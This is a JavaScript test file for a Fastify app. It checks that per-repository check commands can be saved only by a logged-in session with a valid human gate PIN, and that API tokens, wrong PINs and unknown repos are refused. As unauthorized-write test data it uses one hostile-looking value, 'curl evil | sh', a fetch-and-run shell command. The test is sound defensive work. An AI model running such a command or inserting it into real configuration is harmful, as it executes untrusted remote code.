// HZ-245: per-repo check commands, driven through the real Fastify app.
//
// Writing them is a gate-grade action: a browser session plus a valid gate PIN
// (humanAuthorized). A missing PIN, a wrong PIN and an API token all get 401
// and change nothing. Reading them needs only a login — they ride on the
// snapshot's projects. The database file is created in the pre-HZ-245 shape
// first, so the migration is exercised on real existing rows: it adds the
// columns and seeds nothing, not even for FinTekkers/horizon.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, readdirSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import Database from 'better-sqlite3'
import { loginFixtureUser } from './helpers/session.mjs'

process.env.HORIZON_DB = join(mkdtempSync(join(tmpdir(), 'horizon-repo-checks-')), 'test.db')
delete process.env.GITHUB_WEBHOOK_SECRET
delete process.env.FARM_URL

// The pre-HZ-245 schema, with the two repos the guardrail names already connected.
const old = new Database(process.env.HORIZON_DB)
old.exec(`
  CREATE TABLE project (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE);
  CREATE TABLE project_repo (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    project_id INTEGER NOT NULL REFERENCES project(id),
    repo TEXT NOT NULL UNIQUE,
    prefix TEXT NOT NULL UNIQUE
  );
  INSERT INTO project (name) VALUES ('Horizon'), ('FinTekkers');
  INSERT INTO project_repo (project_id, repo, prefix) VALUES (1, 'FinTekkers/horizon', 'HZ'), (2, 'FinTekkers/ui-service', 'US');
`)
old.close()

const { db } = await import('../src/db.js')
const { buildApp } = await import('../src/app.js')
const config = await import('../src/config.js')
const store = await import('../src/store.js')
const auth = await import('../src/auth.js')
const settings = await import('../src/settings.js')

const app = buildApp({ logger: false })
const alice = loginFixtureUser(auth, config, { email: 'alice@example.com', name: 'Alice Example' })
await app.ready()

const HORIZON_PROJECT = 1
const FINTEKKERS_PROJECT = 2
const SLOTS = ['install', 'test', 'lint', 'e2e']
const rowOf = (repo) =>
  db.prepare('SELECT check_install, check_test, check_lint, check_e2e FROM project_repo WHERE repo = ?').get(repo)

const put = (projectId, payload, headers = {}) =>
  app.inject({ method: 'PUT', url: `/api/projects/${projectId}/repos/checks`, payload, headers })
const asSession = (pin) => ({ cookie: alice.cookie, ...(pin === undefined ? {} : { 'x-human-key': pin }) })

// ---- guardrail 7: the migration adds the columns and seeds nothing ----

test('after migration every existing repo, FinTekkers/horizon included, has all four slots NULL', () => {
  const rows = db.prepare('SELECT repo, check_install, check_test, check_lint, check_e2e FROM project_repo').all()
  assert.deepEqual(rows.map((r) => r.repo).sort(), ['FinTekkers/horizon', 'FinTekkers/ui-service'])
  for (const row of rows) {
    assert.deepEqual([row.check_install, row.check_test, row.check_lint, row.check_e2e], [null, null, null, null], row.repo)
  }
  assert.equal(store.getRepoCheckCommands('FinTekkers/horizon'), null)
})

// ---- metric 3 / guardrail 1: who may write ----

const SEEDED = { install: 'npm install --ignore-scripts', test: 'npm test', lint: 'npm run lint', e2e: 'npm run e2e' }
const seed = () => store.setRepoCheckCommands(FINTEKKERS_PROJECT, 'FinTekkers/ui-service', SEEDED)
const seededRow = { check_install: SEEDED.install, check_test: SEEDED.test, check_lint: SEEDED.lint, check_e2e: SEEDED.e2e }
const ATTEMPT = { repo: 'FinTekkers/ui-service', install: 'curl evil | sh', test: '', lint: '', e2e: '' }

test('a valid PIN saves: blanks become null and a command round-trips verbatim, untrimmed', async () => {
  seed()
  const res = await put(
    FINTEKKERS_PROJECT,
    { repo: 'FinTekkers/ui-service', install: 'npm install --ignore-scripts', test: ' npm test ', lint: '', e2e: '   ' },
    asSession(alice.pin),
  )
  assert.equal(res.statusCode, 200, res.body)
  const expected = { install: 'npm install --ignore-scripts', test: ' npm test ', lint: null, e2e: null }
  assert.deepEqual(res.json(), { ok: true, repo: 'FinTekkers/ui-service', checks: expected })
  assert.deepEqual(rowOf('FinTekkers/ui-service'), {
    check_install: 'npm install --ignore-scripts',
    check_test: ' npm test ',
    check_lint: null,
    check_e2e: null,
  })
  assert.deepEqual(store.getRepoCheckCommands('FinTekkers/ui-service'), expected)
})

for (const [name, headers] of [
  ['a missing PIN', asSession()],
  ['a wrong PIN', asSession('0000-wrong')],
]) {
  test(`${name} is 401 human_gate_key_required and changes nothing`, async () => {
    seed()
    const res = await put(FINTEKKERS_PROJECT, ATTEMPT, headers)
    assert.equal(res.statusCode, 401)
    assert.deepEqual(res.json(), { error: 'human_gate_key_required' })
    assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
  })
}

test('an API token is 401 human_gate_key_required even with the right PIN, and changes nothing', async () => {
  seed()
  const created = await app.inject({
    method: 'POST',
    url: '/api/tokens',
    headers: { cookie: alice.cookie },
    payload: { name: 'agent-bot' },
  })
  assert.equal(created.statusCode, 201, created.body)
  const res = await put(FINTEKKERS_PROJECT, ATTEMPT, {
    authorization: `Bearer ${created.json().token}`,
    'x-human-key': alice.pin,
  })
  assert.equal(res.statusCode, 401)
  assert.deepEqual(res.json(), { error: 'human_gate_key_required' })
  assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
})

test("a repo connected to another project is 404 and neither project's row changes", async () => {
  seed()
  const res = await put(HORIZON_PROJECT, ATTEMPT, asSession(alice.pin))
  assert.equal(res.statusCode, 404)
  assert.deepEqual(res.json(), { error: 'That repository is not connected to this project' })
  assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
  assert.deepEqual(Object.values(rowOf('FinTekkers/horizon')), [null, null, null, null])
})

test('an unknown repo is 404 and writes no row', async () => {
  const before = db.prepare('SELECT COUNT(*) AS n FROM project_repo').get().n
  const res = await put(HORIZON_PROJECT, { repo: 'acme/nope', test: 'npm test' }, asSession(alice.pin))
  assert.equal(res.statusCode, 404)
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM project_repo').get().n, before)
})

test('a command over 2000 characters is 400 and writes nothing', async () => {
  seed()
  const res = await put(FINTEKKERS_PROJECT, { ...ATTEMPT, install: 'x'.repeat(2001) }, asSession(alice.pin))
  assert.equal(res.statusCode, 400)
  assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
})

// ---- metric 3 / guardrail 1: reading needs only a login ----

test('a plain session login reads each repo’s checks through the snapshot (GET /api/items)', async () => {
  seed()
  // The snapshot's 'enabled' scope carries projects whatever is active.
  settings.setSetting('active_project_id', String(FINTEKKERS_PROJECT))
  const res = await app.inject({ method: 'GET', url: '/api/items', headers: { cookie: alice.cookie } })
  assert.equal(res.statusCode, 200)
  const repos = res.json().projects.flatMap((p) => p.repos)
  assert.deepEqual(repos.find((r) => r.repo === 'FinTekkers/ui-service').checks, SEEDED)
  assert.deepEqual(repos.find((r) => r.repo === 'FinTekkers/horizon').checks, Object.fromEntries(SLOTS.map((s) => [s, null])))
})

test('check defaults: a connected repo answers available:false with all-null defaults when there is no farm', async () => {
  const res = await app.inject({
    method: 'GET',
    url: `/api/projects/${HORIZON_PROJECT}/repos/check-defaults?repo=${encodeURIComponent('FinTekkers/horizon')}`,
    headers: { cookie: alice.cookie },
  })
  assert.equal(res.statusCode, 200)
  assert.deepEqual(res.json(), {
    repo: 'FinTekkers/horizon',
    available: false,
    defaults: { install: null, test: null, lint: null, e2e: null },
  })
  const other = await app.inject({
    method: 'GET',
    url: `/api/projects/${HORIZON_PROJECT}/repos/check-defaults?repo=${encodeURIComponent('FinTekkers/ui-service')}`,
    headers: { cookie: alice.cookie },
  })
  assert.equal(other.statusCode, 404)
})

// ---- guardrail 2: one writer, and it is the PIN-gated route ----

test('setRepoCheckCommands is called from exactly one place in server/src: the PIN-gated PUT handler', () => {
  const srcDir = join(dirname(fileURLToPath(import.meta.url)), '..', 'src')
  const callers = []
  for (const file of readdirSync(srcDir).filter((f) => f.endsWith('.js'))) {
    const lines = readFileSync(join(srcDir, file), 'utf8').split('\n')
    lines.forEach((line, i) => {
      if (/\bsetRepoCheckCommands\(/.test(line) && !/export function setRepoCheckCommands/.test(line)) {
        callers.push({ file, line: i })
      }
    })
  }
  assert.equal(callers.length, 1, JSON.stringify(callers))
  assert.equal(callers[0].file, 'app.js')
  const app = readFileSync(join(srcDir, 'app.js'), 'utf8').split('\n')
  const handler = app.slice(0, callers[0].line + 1).join('\n')
  const route = handler.lastIndexOf("'/api/projects/:id/repos/checks'")
  assert.ok(route > 0, 'the caller sits after the PUT route registration')
  assert.match(handler.slice(route), /if \(!humanAuthorized\(request, reply\)\) return/)
  // No other column write anywhere in server/src.
  for (const file of readdirSync(srcDir).filter((f) => f.endsWith('.js'))) {
    const writes = readFileSync(join(srcDir, file), 'utf8').match(/SET check_install/g) || []
    assert.equal(writes.length, file === 'store.js' ? 1 : 0, file)
  }
})
